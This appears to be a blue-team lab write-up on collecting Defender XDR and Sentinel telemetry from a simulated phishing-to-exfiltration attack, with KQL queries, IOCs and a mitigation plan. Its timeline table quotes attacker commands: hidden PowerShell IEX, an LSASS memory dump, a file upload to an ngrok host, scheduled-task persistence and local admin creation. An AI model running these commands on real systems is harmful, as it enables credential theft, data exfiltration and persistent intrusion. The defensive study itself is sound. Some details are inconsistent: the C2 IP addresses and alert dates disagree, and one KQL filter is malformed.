# 📥 Phase 3: Log Collection & Data Ingestion

> ⚠️ **Disclaimer**  
> This lab was performed in an isolated Azure-based enterprise simulation strictly for educational purposes. All techniques and telemetry are used to emulate realistic attack patterns for defensive research and blue team skill-building.

---

## 🧠 Overview

In **Phase 3**, we collect and correlate telemetry generated by the simulated attack from Phase 2. Using **Microsoft Defender XDR** and **Microsoft Sentinel**, we:

- Queried PowerShell events, task creation, LSASS access, and reverse shell behavior
- Built a full incident timeline using logs and screenshots
- Extracted indicators of compromise (IOCs)
- Validated which activities were detected vs. missed
- Prepared data to support custom detection rules and response playbooks

The goal of this phase is to evaluate how well Microsoft Sentinel and Defender captured the attack and identify visibility or alerting gaps.

---

## 🧾 Incident Summary Table

| Field                  | Value                                                                                   |
|------------------------|-----------------------------------------------------------------------------------------|
| **Incident Title**     | Hands-on keyboard attack was launched from a compromised account (attack disruption)   |
| **First Alert Time**   | 2025-06-26 4:56 PM UTC                                                                  |
| **Machines Involved**  | `wayne-client`                                                                          |
| **Affected Users**     | `Barbara.HR`                                                                            |
| **MITRE Techniques**   | T1566.002, T1204.002, T1059.001, T1003.001                                              |
| **Alert Types**        | Credential Access, Discovery, Execution, Initial Access, Lateral Movement, Persistence |
| **File Hashes**        | `revshell.ps1` SHA256: `98d7c0e974e4e9f771ef346633c08ac0bf9a9d95a4756148f2f32bbd499257b3`<br>`Resume.docm` SHA256: `cbc440c111184acc4848b1dade91b4ef118b94895b599a2a6b8168e225086ae3`                 |
| **IP Addresses**       | `3.136.65.236`, `99.157.17.206`                                                         |
| **Processes Used**     | `lsass.exe`, `powershell.exe`, `schtasks.exe`, `rundll32.exe`, `net.exe`, `cmd.exe`    |

---

## 📽️ Step-by-Step Timeline with Visual Evidence

### **Step 1 – Initial Access via Phishing (.docm)**
- The attacker sends a malicious Word document with embedded macro.
- Victim Barbara opens the file, which spawns a PowerShell session.

📸 *Victim opens the malicious .docm triggering initial execution*  
![word document spawns a reverse shell with the nrgok app IP address and revshellps1 acting as evidence](https://github.com/user-attachments/assets/a6d11069-f3d8-449e-8a3c-6ab39872bd78)

📸 *KQL query confirms WINWORD was the parent process for PowerShell*  
![KQL query confirms DOCM spawned powershell command](https://github.com/user-attachments/assets/0225bdf4-6438-4c5d-9753-504d80ec7239)

---

### **Step 2 – Reverse Shell via PowerShell and NGROK**
- A hidden PowerShell session downloads and runs `revshell.ps1`, establishing C2.

📸 *PowerShell reverse shell initiated from victim machine*  
![KQL query confirms powershell script established a reverse shell connection to ngrok with ip confirmed](https://github.com/user-attachments/assets/75a22f62-d468-4b2e-bfef-9cc292aa6592)
![reverse shell activity followed by additional suspicious powershell activity on victim machine](https://github.com/user-attachments/assets/73723969-beaf-42b9-bca9-204eaf7584eb)

📸 *The NGROK connection is established successfully for C2*  
![KQL query confirms the IP the reverse shell reached out to](https://github.com/user-attachments/assets/a11bcb4a-95a7-4b5b-858b-91c1e03d481b)

---

### **Step 3 – Attacker Establishes Persistence (Scheduled Task)**
- `schtasks.exe` used to set up a task running `revshell.ps1` on logon.

📸 *Attacker creates scheduled task with hidden PowerShell script*  
![attacker creating more persistance by creating a scheduled task that connects back to their malicious reverse shell ps1](https://github.com/user-attachments/assets/2a6c3c11-301c-467b-a54e-360ca24c9a97)

📸 *KQL confirms persistence method using schtasks.exe*  
![more persistance creating a scheduled task to reconnect the reverse shell](https://github.com/user-attachments/assets/17f2a281-24e7-4d13-9cfd-30548a594e3b)

---

### **Step 4 – Admin Account Created (Local Privilege Escalation)**
- Attacker creates a new local admin user `Joker` to maintain access.

📸 *Attacker adds local admin user "Joker" using net.exe*  
![attacker then creates persistance with an admin account](https://github.com/user-attachments/assets/72ed6710-d229-488e-afe5-95df2a0975b0)

📸 *Confirmation that Joker has administrative privileges and persistence via task*  
![attacker creating persistance by making new user with admin priv](https://github.com/user-attachments/assets/916df9dc-d8f4-46ee-8bae-0abe9b364409)

---

### **Step 5 – Credential Dump (LSASS via rundll32)**
- LSASS memory dumped to retrieve NTLM hashes for pass-the-hash attacks.

📸 *rundll32 is used to dump LSASS memory contents*  
![rundll used to dump lsass](https://github.com/user-attachments/assets/22e83ef0-23c4-4e8f-b70b-90c1db73c794)

📸 *Dumped LSASS file visible on system*  
![shortly after dumps the LSASS file](https://github.com/user-attachments/assets/c64b3750-c155-4690-8798-19c0c27a4edd)

---

### **Step 6 – Domain Discovery and Lateral Movement**
- Attacker enumerates domain users and pivots to `Lucious.R&D`'s machine.

📸 *Domain user enumeration from victim machine*  
![we can see the attacker conducting domain discovery](https://github.com/user-attachments/assets/0501c452-4437-43fb-8833-c5af547bd861)

📸 *Attacker moves laterally to Lucious R&D machine and accesses files*  
![attacker moving laterally into lucious account](https://github.com/user-attachments/assets/8e7d6d15-d396-44cd-bc4b-f145f2f2a594)

---

### **Step 7 – Data Exfiltration (Unalerted)**
- Sensitive `.bmp` file containing Batmobile schematics is exfiltrated using PowerShell POST to NGROK.
- No corresponding alert was generated for the exfiltration event, indicating a gap in our sercurity configurations.

📸 *File exfiltrated over HTTPS using PowerShell*  
![followed by sensitive data exfil](https://github.com/user-attachments/assets/1f8bc933-83e2-4919-8104-87ef0a553092)

---

### **Step 8 – Incident Triggered in Microsoft Defender**
- Multiple alerts correlate into an incident seen in Defender XDR and Sentinel.

📸 *Microsoft Defender attack graph showing timeline and components*  
![Graphical Attack Map](https://github.com/user-attachments/assets/ab76bbce-2dfd-4efc-9767-7db151d04818)

📸 *Full incident structure rendered in Microsoft Sentinel*  
![Incident spawned from attack](https://github.com/user-attachments/assets/f2bb3290-0d7f-434c-83e6-01dc621e6769)
![Incident alerts](https://github.com/user-attachments/assets/a8d52f7f-e0ab-4f37-b79c-6bbc19d7f867)

---

## 📊 KQL Queries with Screenshots

```kql
// PowerShell events filtered by Barbara’s account
DeviceProcessEvents
| where InitiatingProcessAccountName contains "barbara"
| where FileName in~ ("powershell.exe", "pwsh.exe")
| sort by TimeGenerated desc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

```kql
// Scheduled task creation by attacker
DeviceEvents
| where FileName has "schtasks.exe"
| where InitiatingProcessAccountName contains "barbara"
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, AccountName
```

```kql
// Local admin user creation using net.exe
DeviceProcessEvents
| where FileName =~ "net.exe"
| where ProcessCommandLine has "user Joker" or "Administrators Joker"
```

```kql
// NGROK C2 traffic via PowerShell
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "powershell.exe"
| where RemoteUrl has "ngrok" or RemoteIP in ("3.134.125.175", "99.157.17.206")
```

---

## 📄 IOC Table (CSV Consolidation)

| Indicator Type | Value                                       | Source              |
|----------------|---------------------------------------------|---------------------|
| IP Address     | 3.134.125.175                               | reverse shell (C2)  |
| File Name      | revshell.ps1                                | malicious payload   |
| SHA256 Hash    | 98d7c0e974e4e9f771ef346633c08ac0bf9a9d95a4.. | revshell.ps1        |
| File Name      | Wayne_Enterprises_Resume.docm               | phishing document   |
| SHA256 Hash    | cbc440c111184acc4848b1dade91b4ef118b94895.. | Resume.docm         |
| Process        | powershell.exe                              | post-exploitation   |
| Process        | rundll32.exe                                | LSASS dump          |
| URL            | `https://<ngrok>.ngrok-free.app/revshell.ps1` | C2 download path    |

---

## 📅 Sentinel Workbook Timeline Table

| TimeGenerated (UTC)     | DeviceName              | InitiatingProcessCommandLine                                                                                  |
|-------------------------|-------------------------|---------------------------------------------------------------------------------------------------------------|
| 6/27/2025, 6:26:43 PM   | wayne-client.wayne.corp | `WINWORD.EXE /n "C:\Users\Barbara.HR\Desktop\Wayne_Enterprises_Resume.docm" /o ""`                         |
| 6/27/2025, 6:28:31 PM   | wayne-client.wayne.corp | `powershell.exe -ep Bypass -w hidden -Command IEX(...)`                                                      |
| 6/28/2025, 9:46:43 AM   | wayne-client.wayne.corp | `rundll32.exe comsvcs.dll MiniDump 772 C:\Windows\Temp\lsass.dmp full`                                     |
| 6/28/2025, 11:06:10 AM  | wayne-client.wayne.corp | `powershell.exe cd "C:\Users\Lucious.R&D\Documents"`                                                     |
| 6/28/2025, 11:28:37 AM  | wayne-client.wayne.corp | `powershell.exe Invoke-WebRequest -Uri http://<ngrok>/upload -InFile batmobile.bmp`                          |
| 6/28/2025, 11:32:21 AM  | wayne-client.wayne.corp | `schtasks.exe /create /tn "Updater" /tr "powershell.exe -w hidden -File C:\Users\Public\revshell.ps1"`     |
| 6/28/2025, 11:33:54 AM  | wayne-client.wayne.corp | `net user Joker Pass123 /add && net localgroup administrators Joker /add`                                    |

📸 *Part of the Sentinel workbook beginning the timeline of events*  
![workbook in sentinel with saved queries used to build a timeline of the attack](https://github.com/user-attachments/assets/424be599-9504-432e-ba34-1f14fe6d7862)

## 🧠 End Summary & Detection Gap

Phase 3 transformed the attack simulation into actionable security telemetry. Most key behaviors were logged and correlated by Microsoft Defender and Sentinel:

- ✅ PowerShell execution
- ✅ Persistence mechanisms
- ✅ Credential dumping
- ✅ RDP lateral movement

> ❌ **However, the final stage – exfiltration of `batmobile.bmp` – was not detected.**

This confirms a classic detection gap: **low-noise data exfiltration** can easily bypass traditional behavior-based detection.

### 🛡 Mitigation Plan:
- Implement **Data Loss Prevention (DLP)** policies on endpoints
- Flag file types (.bmp, .docx, .pdf) being POSTed externally
- Alert on PowerShell activity invoking file uploads or unknown HTTP hosts

### 💡 Looking Ahead:
These findings will inform our Phase 4 detection engineering. We'll build custom Sentinel queries and analytic rules to:
- Detect low-and-slow exfiltration
- Correlate scheduled task and new-user creation under suspicious chains
- Create automated response playbooks to isolate machines and revoke tokens

---

## ✅ Phase 3 Complete

Phase 3 closes the telemetry feedback loop. We've:
- Captured rich, correlated logs across Sentinel and Defender
- Identified a key blind spot
- Proposed realistic mitigations

---

**Next Phase:** [Phase 4 – Detection Rules & Analytics](https://github.com/bnmou/Azure-Enterprise-Simulation/blob/main/4%20-%20Detection%20Rules%20%26%20Analytics.md)
